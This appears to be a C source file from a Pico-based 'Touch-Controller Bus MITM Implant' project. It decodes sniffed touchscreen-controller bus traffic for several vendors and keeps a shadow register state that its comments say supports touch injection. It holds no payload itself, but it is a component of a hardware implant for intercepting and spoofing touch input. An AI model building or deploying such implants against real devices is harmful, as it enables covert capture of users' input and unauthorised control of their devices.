/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * touch_decode.c — Vendor-specific touch register decoders
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Decodes raw I2C/SPI transactions into abstract touch events using
 * the vendor register maps defined in registers.h. Each vendor has a
 * different register layout and coordinate encoding, so we dispatch
 * to per-vendor decoder functions.
 */

#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "board.h"
#include "registers.h"

/* --- Transaction structure (mirrors core1.c) ------------------------ */
typedef struct {
    bool     is_read;
    uint16_t reg_offset;
    uint16_t data_len;
    uint8_t  data[128];
} tp_transaction_t;

/* --- Shadow register state (tracks host writes for injection) ------- */
/* Maintains a mirror of the touch-controller's register state so that
 * injection can produce consistent register values. */
static uint8_t  shadow_regs[4096];  /* simplified: 4 KB shadow */
static uint16_t shadow_last_offset;

/* --- Helper: extract 16-bit LE value ------------------------------- */
static inline uint16_t le16(const uint8_t *p)
{
    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

/* --- Helper: extract 16-bit BE value ------------------------------- */
static inline uint16_t be16(const uint8_t *p)
{
    return ((uint16_t)p[0] << 8) | (uint16_t)p[1];
}

/* --- Goodix GT9xx decoder ------------------------------------------ */
/* Goodix uses 16-bit register addresses, big-endian.
 * Touch state at 0x814E (1 byte): bit7=buffer ready, bits3:0=finger count.
 * Coordinates start at 0x8150, each point is 8 bytes:
 *   [0] TrackID, [1-2] X (LE), [3-4] Y (LE), [5] Area, [6-7] reserved.
 * Gesture ID at 0x8170. */
static bool decode_goodix(const tp_transaction_t *txn, tp_bus_state_t *state,
                          tp_event_t *out)
{
    if (txn->reg_offset == 0x814E && txn->is_read && txn->data_len >= 1) {
        uint8_t status = txn->data[0];
        uint8_t finger_count = status & GT_FINGER_COUNT_MASK;

        if (status & GT_STATUS_BUF_READY) {
            /* Host read the touch state; the coordinate read will follow
             * at 0x8150. We emit the event when coordinates are read. */
            return false;
        }
        if (status & GT_STATUS_RESET) {
            out->type = TP_EV_BUS_EVENT;
            out->gesture_id = 0;
            return true;
        }
        return false;
    }

    /* Coordinate read: 0x8150 + (finger * 8) */
    if (txn->reg_offset >= 0x8150 && txn->reg_offset <= 0x8198 &&
        txn->is_read && txn->data_len >= 8) {
        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_GOODIX;
        out->timestamp_us = time_us_32();
        out->finger_count = 0;

        /* Decode all points in this read (up to 10, each 8 bytes) */
        uint16_t avail = txn->data_len / 8;
        if (avail > TP_MAX_FINGERS) avail = TP_MAX_FINGERS;

        for (uint16_t i = 0; i < avail; i++) {
            const uint8_t *p = &txn->data[i * 8];
            uint8_t track_id = p[0];
            if (track_id == 0xFF) continue;  /* inactive slot */

            tp_touch_t *t = &out->fingers[out->finger_count++];
            t->finger_id = track_id & 0x0F;
            t->x = le16(&p[1]);
            t->y = le16(&p[3]);
            t->pressure = p[5];  /* area/pressure */
            t->width = p[5];
            t->flags = 0x02;  /* in-contact */
        }

        if (out->finger_count > 0)
            return true;
        return false;
    }

    /* Gesture read at 0x8170 */
    if (txn->reg_offset == 0x8170 && txn->is_read && txn->data_len >= 1) {
        out->type = TP_EV_GESTURE;
        out->vendor = TP_TC_GOODIX;
        out->gesture_id = txn->data[0];
        out->timestamp_us = time_us_32();
        return true;
    }

    /* Config writes: track for shadow model */
    if (!txn->is_read && txn->data_len > 0) {
        if (txn->reg_offset < sizeof(shadow_regs)) {
            for (uint16_t i = 0; i < txn->data_len &&
                 (uint32_t)(txn->reg_offset + i) < sizeof(shadow_regs); i++) {
                shadow_regs[txn->reg_offset + i] = txn->data[i];
            }
            shadow_last_offset = txn->reg_offset;

            /* Check if this is a firmware-update register write */
            const tp_reg_entry_t *re = tp_reg_lookup(TP_TC_GOODIX, txn->reg_offset);
            if (re && re->semantic == TP_REG_FW_UPDATE) {
                out->type = TP_EV_FW_UPDATE;
                out->reg_addr = txn->reg_offset;
                out->reg_len = txn->data_len;
                out->timestamp_us = time_us_32();
                return true;
            }
            if (re && re->semantic == TP_REG_CONFIG) {
                out->type = TP_EV_CONFIG;
                out->reg_addr = txn->reg_offset;
                out->reg_len = txn->data_len;
                out->timestamp_us = time_us_32();
                return true;
            }
        }
    }

    return false;
}

/* --- FocalTech FT5xx decoder ---------------------------------------- */
/* FocalTech uses 8-bit register addresses.
 * Touch count at 0x02 (lower nibble of 0x02), points start at 0x03.
 * Each point is 6 bytes:
 *   [0] X_H (bits 3:0 = event: 0=down,1=up,2=contact,3=none)
 *   [1] X_L
 *   [2] Y_H (bits 3:0 = touch ID)
 *   [3] Y_L
 *   [4] weight (pressure)
 *   [5] area */
static bool decode_focaltech(const tp_transaction_t *txn, tp_bus_state_t *state,
                              tp_event_t *out)
{
    /* Touch data read: offset 0x03..0x1E (points 1-5) */
    if (txn->reg_offset >= 0x03 && txn->reg_offset <= 0x1E &&
        txn->is_read && txn->data_len >= 6) {
        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_FOCALTECH;
        out->timestamp_us = time_us_32();
        out->finger_count = 0;

        uint16_t avail = txn->data_len / FT_POINT_STRUCT_LEN;
        if (avail > TP_MAX_FINGERS) avail = TP_MAX_FINGERS;

        for (uint16_t i = 0; i < avail; i++) {
            const uint8_t *p = &txn->data[i * FT_POINT_STRUCT_LEN];
            uint8_t event = (p[0] >> 4) & 0x03;
            if (event == FT_EVENT_NONE) continue;  /* empty slot */

            tp_touch_t *t = &out->fingers[out->finger_count++];
            t->finger_id = p[2] & 0x0F;  /* touch ID from Y_H low nibble */
            t->x = ((uint16_t)(p[0] & 0x0F) << 8) | p[1];
            t->y = ((uint16_t)(p[2] & 0x0F) << 8) | p[3];
            t->pressure = p[4];
            t->width = p[5];
            t->flags = 0;
            if (event == FT_EVENT_DOWN)      t->flags |= 0x01;
            if (event == FT_EVENT_CONTACT)   t->flags |= 0x02;
        }

        if (out->finger_count > 0)
            return true;
        return false;
    }

    /* Gesture at 0x01 */
    if (txn->reg_offset == 0x01 && txn->is_read && txn->data_len >= 1) {
        if (txn->data[0] != 0) {
            out->type = TP_EV_GESTURE;
            out->vendor = TP_TC_FOCALTECH;
            out->gesture_id = txn->data[0];
            out->timestamp_us = time_us_32();
            return true;
        }
    }

    /* Config / firmware-update writes */
    if (!txn->is_read && txn->data_len > 0) {
        const tp_reg_entry_t *re = tp_reg_lookup(TP_TC_FOCALTECH, txn->reg_offset);
        if (re) {
            if (re->semantic == TP_REG_FW_UPDATE) {
                out->type = TP_EV_FW_UPDATE;
                out->reg_addr = txn->reg_offset;
                out->reg_len = txn->data_len;
                out->timestamp_us = time_us_32();
                return true;
            }
            if (re->semantic == TP_REG_CONFIG) {
                out->type = TP_EV_CONFIG;
                out->reg_addr = txn->reg_offset;
                out->reg_len = txn->data_len;
                out->timestamp_us = time_us_32();
                return true;
            }
        }
    }

    return false;
}

/* --- Synaptics decoder ---------------------------------------------- */
/* Synaptics S3320: 16-bit LE register address.
 * FingerState at 0x0015 (bits 0-3 = active fingers bitmask).
 * Points from 0x0018, each 6 bytes:
 *   [0-1] X (LE), [2-3] Y (LE), [4] Z (pressure), [5] flags. */
static bool decode_synaptics(const tp_transaction_t *txn, tp_bus_state_t *state,
                              tp_event_t *out)
{
    if (txn->reg_offset == 0x0015 && txn->is_read && txn->data_len >= 1) {
        /* Finger state byte: just track which fingers are active */
        uint8_t finger_mask = txn->data[0] & SYN_FINGER_MASK;
        if (finger_mask == 0) {
            out->type = TP_EV_RELEASE;
            out->vendor = TP_TC_SYNAPTICS;
            out->timestamp_us = time_us_32();
            return true;
        }
        return false;
    }

    /* Coordinate read: 0x0018 + (finger * 6) */
    if (txn->reg_offset >= 0x0018 && txn->reg_offset <= 0x004E &&
        txn->is_read && txn->data_len >= 6) {
        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_SYNAPTICS;
        out->timestamp_us = time_us_32();
        out->finger_count = 0;

        uint16_t avail = txn->data_len / SYN_POINT_STRUCT_LEN;
        if (avail > TP_MAX_FINGERS) avail = TP_MAX_FINGERS;

        for (uint16_t i = 0; i < avail; i++) {
            const uint8_t *p = &txn->data[i * SYN_POINT_STRUCT_LEN];
            tp_touch_t *t = &out->fingers[out->finger_count++];
            t->finger_id = i;
            t->x = le16(&p[0]);
            t->y = le16(&p[2]);
            t->pressure = p[4];
            t->width = 0;
            t->flags = 0x02;  /* in-contact */
        }

        if (out->finger_count > 0)
            return true;
        return false;
    }

    /* Config writes */
    if (!txn->is_read) {
        const tp_reg_entry_t *re = tp_reg_lookup(TP_TC_SYNAPTICS, txn->reg_offset);
        if (re) {
            if (re->semantic == TP_REG_CONFIG) {
                out->type = TP_EV_CONFIG;
                out->reg_addr = txn->reg_offset;
                out->reg_len = txn->data_len;
                out->timestamp_us = time_us_32();
                return true;
            }
            if (re->semantic == TP_REG_FW_UPDATE) {
                out->type = TP_EV_FW_UPDATE;
                out->reg_addr = txn->reg_offset;
                out->reg_len = txn->data_len;
                out->timestamp_us = time_us_32();
                return true;
            }
        }
    }

    return false;
}

/* --- Ilitek decoder ------------------------------------------------- */
static bool decode_ilitek(const tp_transaction_t *txn, tp_bus_state_t *state,
                           tp_event_t *out)
{
    /* Touch count at 0x0010 */
    if (txn->reg_offset == 0x0010 && txn->is_read && txn->data_len >= 1) {
        uint8_t count = txn->data[0];
        if (count == 0) {
            out->type = TP_EV_RELEASE;
            out->vendor = TP_TC_ILITEK;
            out->timestamp_us = time_us_32();
            return true;
        }
        return false;
    }

    /* Coordinates: 0x0020 + (finger * 8) */
    if (txn->reg_offset >= 0x0020 && txn->reg_offset <= 0x0068 &&
        txn->is_read && txn->data_len >= 8) {
        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_ILITEK;
        out->timestamp_us = time_us_32();
        out->finger_count = 0;

        uint16_t avail = txn->data_len / ILI_POINT_STRUCT_LEN;
        if (avail > TP_MAX_FINGERS) avail = TP_MAX_FINGERS;

        for (uint16_t i = 0; i < avail; i++) {
            const uint8_t *p = &txn->data[i * ILI_POINT_STRUCT_LEN];
            /* Ilitek format: [0-1] X, [2-3] Y, [4] pressure, [5] width,
             * [6] track ID, [7] flags */
            tp_touch_t *t = &out->fingers[out->finger_count++];
            t->finger_id = p[6] & 0x0F;
            t->x = le16(&p[0]);
            t->y = le16(&p[2]);
            t->pressure = p[4];
            t->width = p[5];
            t->flags = 0x02;
        }

        if (out->finger_count > 0)
            return true;
        return false;
    }

    return false;
}

/* --- Cypress decoder ------------------------------------------------ */
static bool decode_cypress(const tp_transaction_t *txn, tp_bus_state_t *state,
                            tp_event_t *out)
{
    /* Touch count at 0x0012 */
    if (txn->reg_offset == 0x0012 && txn->is_read && txn->data_len >= 1) {
        uint8_t count = txn->data[0];
        if (count == 0) {
            out->type = TP_EV_RELEASE;
            out->vendor = TP_TC_CYPRESS;
            out->timestamp_us = time_us_32();
            return true;
        }
        return false;
    }

    /* Coordinates: 0x0020 + (finger * 6) */
    if (txn->reg_offset >= 0x0020 && txn->reg_offset <= 0x003E &&
        txn->is_read && txn->data_len >= 6) {
        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_CYPRESS;
        out->timestamp_us = time_us_32();
        out->finger_count = 0;

        uint16_t avail = txn->data_len / CYP_POINT_STRUCT_LEN;
        if (avail > TP_MAX_FINGERS) avail = TP_MAX_FINGERS;

        for (uint16_t i = 0; i < avail; i++) {
            const uint8_t *p = &txn->data[i * CYP_POINT_STRUCT_LEN];
            tp_touch_t *t = &out->fingers[out->finger_count++];
            t->finger_id = i;
            t->x = le16(&p[0]);
            t->y = le16(&p[2]);
            t->pressure = p[4];
            t->width = p[5];
            t->flags = 0x02;
        }

        if (out->finger_count > 0)
            return true;
        return false;
    }

    return false;
}

/* --- Atmel decoder -------------------------------------------------- */
static bool decode_atmel(const tp_transaction_t *txn, tp_bus_state_t *state,
                         tp_event_t *out)
{
    /* Atmel uses message-based protocol via T9 object at 0x0014 */
    if (txn->reg_offset == 0x0014 && txn->is_read && txn->data_len >= 8) {
        /* T9 message: [0] report ID, [1] status, [2-3] X, [4-5] Y,
         * [6] area, [7] amplitude */
        uint8_t status = txn->data[1];
        if (status == 0) {  /* release */
            out->type = TP_EV_RELEASE;
            out->vendor = TP_TC_ATMEL;
            out->timestamp_us = time_us_32();
            return true;
        }

        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_ATMEL;
        out->timestamp_us = time_us_32();
        out->finger_count = 1;
        tp_touch_t *t = &out->fingers[0];
        t->finger_id = txn->data[0] & 0x0F;
        t->x = le16(&txn->data[2]);
        t->y = le16(&txn->data[4]);
        t->pressure = txn->data[7];
        t->width = txn->data[6];
        t->flags = (status & 0x01) ? 0x02 : 0x01;  /* press or move */
        return true;
    }

    return false;
}

/* --- Novatek decoder ----------------------------------------------- */
static bool decode_novatek(const tp_transaction_t *txn, tp_bus_state_t *state,
                            tp_event_t *out)
{
    /* Finger count at 0x0012 */
    if (txn->reg_offset == 0x0012 && txn->is_read && txn->data_len >= 1) {
        uint8_t count = txn->data[0];
        if (count == 0) {
            out->type = TP_EV_RELEASE;
            out->vendor = TP_TC_NOVATEK;
            out->timestamp_us = time_us_32();
            return true;
        }
        return false;
    }

    /* Coordinates: 0x0020 + (finger * 8) */
    if (txn->reg_offset >= 0x0020 && txn->reg_offset <= 0x0068 &&
        txn->is_read && txn->data_len >= 8) {
        out->type = TP_EV_TOUCH;
        out->vendor = TP_TC_NOVATEK;
        out->timestamp_us = time_us_32();
        out->finger_count = 0;

        uint16_t avail = txn->data_len / NVK_POINT_STRUCT_LEN;
        if (avail > TP_MAX_FINGERS) avail = TP_MAX_FINGERS;

        for (uint16_t i = 0; i < avail; i++) {
            const uint8_t *p = &txn->data[i * NVK_POINT_STRUCT_LEN];
            tp_touch_t *t = &out->fingers[out->finger_count++];
            t->finger_id = p[6] & 0x0F;
            t->x = le16(&p[0]);
            t->y = le16(&p[2]);
            t->pressure = p[4];
            t->width = p[5];
            t->flags = 0x02;
        }

        if (out->finger_count > 0)
            return true;
        return false;
    }

    return false;
}

/* --- Main decode dispatch ------------------------------------------ */
bool tp_decode_transaction(const uint8_t *raw, uint16_t len,
                            tp_bus_state_t *state,
                            tp_event_t *out_event)
{
    if (!raw || len < sizeof(tp_transaction_t) || !out_event)
        return false;

    const tp_transaction_t *txn = (const tp_transaction_t *)raw;
    memset(out_event, 0, sizeof(tp_event_t));

    switch (state->vendor) {
    case TP_TC_GOODIX:
        return decode_goodix(txn, state, out_event);
    case TP_TC_FOCALTECH:
        return decode_focaltech(txn, state, out_event);
    case TP_TC_SYNAPTICS:
        return decode_synaptics(txn, state, out_event);
    case TP_TC_ILITEK:
        return decode_ilitek(txn, state, out_event);
    case TP_TC_CYPRESS:
        return decode_cypress(txn, state, out_event);
    case TP_TC_ATMEL:
        return decode_atmel(txn, state, out_event);
    case TP_TC_NOVATEK:
        return decode_novatek(txn, state, out_event);
    default:
        /* Unknown vendor: log as raw bus event */
        if (txn->data_len > 0) {
            out_event->type = TP_EV_BUS_EVENT;
            out_event->reg_addr = txn->reg_offset;
            out_event->reg_len = txn->data_len;
            out_event->timestamp_us = time_us_32();
            return true;
        }
        return false;
    }
}

/* --- Get shadow register value (for injection consistency) -------- */
bool tp_get_shadow_reg(uint16_t offset, uint8_t *out_val)
{
    if (offset >= sizeof(shadow_regs))
        return false;
    *out_val = shadow_regs[offset];
    return true;
}

/* --- Set shadow register (for injection pre-load) ------------------- */
void tp_set_shadow_reg(uint16_t offset, uint8_t val)
{
    if (offset < sizeof(shadow_regs))
        shadow_regs[offset] = val;
}